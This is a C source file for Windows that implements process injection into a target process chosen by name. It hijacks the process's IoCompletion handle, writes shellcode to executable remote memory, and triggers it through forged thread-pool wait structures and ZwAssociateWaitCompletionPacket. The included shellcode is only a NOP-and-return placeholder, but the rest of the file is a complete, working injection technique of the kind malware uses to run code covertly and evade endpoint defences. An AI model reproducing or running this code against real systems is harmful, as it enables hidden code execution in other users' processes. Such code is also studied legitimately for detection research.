#include <Windows.h>
#include <stdint.h>
#include <stdio.h>
#include <Shlobj.h>
#include <tlhelp32.h>
#include <winternl.h>
#include <ntstatus.h>
#include <wchar.h>

#define ProcessHandleSnapshotInformation ((PROCESSINFOCLASS)51)

// size: 0x1D8
typedef struct _TP_WAIT {
    uint8_t not_used_0[0x50];
    PVOID Callback;
    PVOID Context;
    uint8_t not_used_1[0x2a];
    PVOID Pool;
    PVOID PoolObjectLinks;
    uint8_t not_used_2[0xce];
    HANDLE WaitPkt;
    uint8_t not_used_3[0x10];
    PVOID Direct;
} TP_WAIT;

typedef NTSTATUS(*ZwAssociateWaitCompletionPacket)(
    _In_ HANDLE WaitCompletionPacketHandle,
    _In_ HANDLE IoCompletionHandle,
    _In_ HANDLE TargetObjectHandle,
    _In_opt_ PVOID KeyContext,
    _In_opt_ PVOID ApcContext,
    _In_ NTSTATUS IoStatus,
    _In_ ULONG_PTR IoStatusInformation,
    _Out_opt_ PBOOLEAN AlreadySignaled
    );

typedef struct _PROCESS_HANDLE_TABLE_ENTRY_INFO
{
    HANDLE HandleValue;
    SIZE_T HandleCount;
    SIZE_T PointerCount;
    ACCESS_MASK GrantedAccess;
    ULONG ObjectTypeIndex;
    ULONG HandleAttributes;
    ULONG Reserved;
} PROCESS_HANDLE_TABLE_ENTRY_INFO, * PPROCESS_HANDLE_TABLE_ENTRY_INFO;

typedef struct _PROCESS_HANDLE_SNAPSHOT_INFORMATION
{
    ULONG_PTR NumberOfHandles;
    ULONG_PTR Reserved;
    _Field_size_(NumberOfHandles) PROCESS_HANDLE_TABLE_ENTRY_INFO Handles[1];
} PROCESS_HANDLE_SNAPSHOT_INFORMATION, * PPROCESS_HANDLE_SNAPSHOT_INFORMATION;


uint8_t SHELLCODE[] = {
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0xc3
};

HANDLE get_io_completion_handle(HANDLE hProcess) {
    NTSTATUS status = 0;
    HANDLE hIoCompletion = 0;
    HANDLE hEvent = 0;
    HANDLE hWaitCompletionPacket = 0;
    ULONG size = sizeof(PROCESS_HANDLE_SNAPSHOT_INFORMATION);
    PROCESS_HANDLE_SNAPSHOT_INFORMATION* proc_handle_snapshot_info =
        (PROCESS_HANDLE_SNAPSHOT_INFORMATION*)HeapAlloc(
            GetProcessHeap(),
            HEAP_ZERO_MEMORY,
            size
        );

    if (proc_handle_snapshot_info == NULL) {
        printf("PROCESS_HANDLE_SNAPSHOT_INFORMATION HeapAlloc failed (%lu)\n", GetLastError());
        return 0;
    }

    status = NtQueryInformationProcess(
        hProcess,
        ProcessHandleSnapshotInformation,
        proc_handle_snapshot_info,
        size,
        &size
    );

    while (status == STATUS_INFO_LENGTH_MISMATCH) {
        proc_handle_snapshot_info =
            (PROCESS_HANDLE_SNAPSHOT_INFORMATION*)HeapReAlloc(
                GetProcessHeap(),
                HEAP_ZERO_MEMORY,
                proc_handle_snapshot_info,
                size
            );

        if (proc_handle_snapshot_info == NULL) {
            printf("PROCESS_HANDLE_SNAPSHOT_INFORMATION HeapReAlloc failed (%lu)\n", GetLastError());
            return 0;
        }

        status = NtQueryInformationProcess(
            hProcess,
            ProcessHandleSnapshotInformation,
            proc_handle_snapshot_info,
            size,
            &size
        );
    }

    for (uint32_t i = 0; i < proc_handle_snapshot_info->NumberOfHandles; i++) {
        HANDLE dup_handle = NULL;

        if (!DuplicateHandle(
            hProcess,
            proc_handle_snapshot_info->Handles[i].HandleValue,
            GetCurrentProcess(),
            &dup_handle,
            0,
            FALSE,
            DUPLICATE_SAME_ACCESS
        ))
            continue;

        size = sizeof(PUBLIC_OBJECT_TYPE_INFORMATION);
        PUBLIC_OBJECT_TYPE_INFORMATION* obj_info_class =
            (PUBLIC_OBJECT_TYPE_INFORMATION*)HeapAlloc(
                GetProcessHeap(),
                HEAP_ZERO_MEMORY,
                size
            );

        if (obj_info_class == NULL) {
            printf("PUBLIC_OBJECT_TYPE_INFORMATION HeapAlloc failed (%lu)\n", GetLastError());
            return 0;
        }

        status = NtQueryObject(
            dup_handle,
            ObjectTypeInformation,
            obj_info_class,
            size,
            &size
        );

        while (status == STATUS_INFO_LENGTH_MISMATCH) {
            obj_info_class =
                (PUBLIC_OBJECT_TYPE_INFORMATION*)HeapReAlloc(
                    GetProcessHeap(),
                    HEAP_ZERO_MEMORY,
                    obj_info_class,
                    size
                );

            if (obj_info_class == NULL) {
                printf("PUBLIC_OBJECT_TYPE_INFORMATION HeapReAlloc failed (%lu)\n", GetLastError());
                return 0;
            }

            status = NtQueryObject(
                dup_handle,
                ObjectTypeInformation,
                obj_info_class,
                size,
                &size
            );
        }

        if (obj_info_class->TypeName.Length > 0) {
            if (wcscmp(obj_info_class->TypeName.Buffer, L"Event") == 0) {
                hEvent = dup_handle;
            }

            if (wcscmp(obj_info_class->TypeName.Buffer, L"WaitCompletionPacket") == 0) {
                hWaitCompletionPacket = dup_handle;
                CloseHandle(hEvent);
            }

            if (wcscmp(obj_info_class->TypeName.Buffer, L"IoCompletion") == 0) {
                hIoCompletion = dup_handle;
                CloseHandle(hWaitCompletionPacket);
                break;
            }
        }
    }

    return hIoCompletion;
}

void do_injection(HANDLE hProcess, HANDLE ioCompletion_handle) {
    // write the shellcode
    PVOID sh_buffer = VirtualAllocEx(
        hProcess,
        NULL,
        sizeof(SHELLCODE),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );

    if (sh_buffer == NULL) {
        printf("VirtualAllocEx failed (%lu)\n", GetLastError());
        return;
    }

    WriteProcessMemory(
        hProcess,
        sh_buffer,
        SHELLCODE,
        sizeof(SHELLCODE),
        NULL
    );

    printf("Schellcode written at remote address: 0x%llx\n", sh_buffer);       

    TP_WAIT* tpw = (TP_WAIT*)CreateThreadpoolWait((PTP_WAIT_CALLBACK)sh_buffer, sh_buffer, 0);
        
    // *** ALLOCATION ***
    PVOID tp_wait_buffer = VirtualAllocEx(
        hProcess,
        NULL,
        0x1000,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );

    if (tp_wait_buffer == NULL) {
        printf("VirtualAllocEx failed (%lu)\n", GetLastError());
        return;
    }

    PVOID tp_direct_buffer = VirtualAllocEx(
        hProcess,
        NULL,
        0x1000,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );

    if (tp_direct_buffer == NULL) {
        printf("VirtualAllocEx failed (%lu)\n", GetLastError());
        return;
    }

    PVOID tp_pool_buffer = VirtualAllocEx(
        hProcess,
        NULL,
        0x1000,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );

    if (tp_pool_buffer == NULL) {
        printf("VirtualAllocEx failed (%lu)\n", GetLastError());
        return;
    }

    // *** WRITING ***
    printf("Local TP_WAIT->Callback: 0x%llx\n", tpw->Callback);
    printf("Local TP_WAIT->Context: 0x%llx\n", tpw->Context);
    printf("Local TP_WAIT->Pool: 0x%llx\n", tpw->Pool);
    printf("Local TP_WAIT->WaitPkt: 0x%llx\n", tpw->WaitPkt);
    printf("Remote TP_WAIT Written at remote address: 0x%llx\n", tp_wait_buffer);
    printf("Remote TP_WAIT->Direct Written at remote address: 0x%llx\n", tp_direct_buffer);
    printf("Remote TP_WAIT->Pool Written at remote address: 0x%llx\n", tp_pool_buffer);
    
    WriteProcessMemory(
        hProcess,
        tp_wait_buffer,
        tpw,
        0x900,
        NULL
    );
      
    WriteProcessMemory(
        hProcess,
        tp_direct_buffer,
        &tpw->Direct,
        0x900,
        NULL
    );

    WriteProcessMemory(
        hProcess,
        tp_pool_buffer,
        &tpw->Pool,
        0x900, 
        NULL
    );

    // step 3
    HANDLE event = CreateEvent(NULL, FALSE, FALSE, NULL);
    if (event) {
        HMODULE h_ntdll = GetModuleHandle(L"ntdll.dll");
        ZwAssociateWaitCompletionPacket fntZwAssociateWaitCompletionPacket = (ZwAssociateWaitCompletionPacket)GetProcAddress(h_ntdll, "ZwAssociateWaitCompletionPacket");
        NTSTATUS status = fntZwAssociateWaitCompletionPacket(
            tpw->WaitPkt,
            ioCompletion_handle,
            event,
            tp_direct_buffer,
            tp_wait_buffer,
            STATUS_SUCCESS,
            0,
            0
        );

        // signal the event to trigger execution
        if (NT_SUCCESS(status))
            SetEvent(event);
    }
}

void injection_into_process(uint32_t pid) {
    HANDLE hProcess = OpenProcess(
        PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_DUP_HANDLE | PROCESS_VM_OPERATION,
        FALSE,
        pid
    );
    HANDLE ioCompletion_handle = get_io_completion_handle(hProcess);
    do_injection(hProcess, ioCompletion_handle);
    CloseHandle(hProcess);

}

uint32_t get_proc_pid(LPCTSTR proc_name) {
    HANDLE hSnapshot;
    PROCESSENTRY32 pe;
    uint32_t pid = 0;

    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE)
        return NULL;
    pe.dwSize = sizeof(PROCESSENTRY32);

    if (Process32First(hSnapshot, &pe)) {
        do {
            if (wcscmp(pe.szExeFile, proc_name) == 0) {
                pid = pe.th32ProcessID;
                break;
            }
        } while (Process32Next(hSnapshot, &pe));
    }

    CloseHandle(hSnapshot);
    return pid;
}

void main(void) {
    int argc = 0;
    LPWSTR* argv = CommandLineToArgvW(GetCommandLine(), &argc);
    if (argc < 2) {
        printf("Usage: %ls <process_name>\n", argv[0]);
        return;
	}

    if (IsUserAnAdmin()) {
        uint32_t pid = get_proc_pid(argv[1]);
        if (pid != 0) {
            injection_into_process(pid);
        }
        else {
            printf("Failed to start process.\n");
        }
    }
    else {
        printf("The user is not an administrator, please run the process as an Administrator\n");
    }
}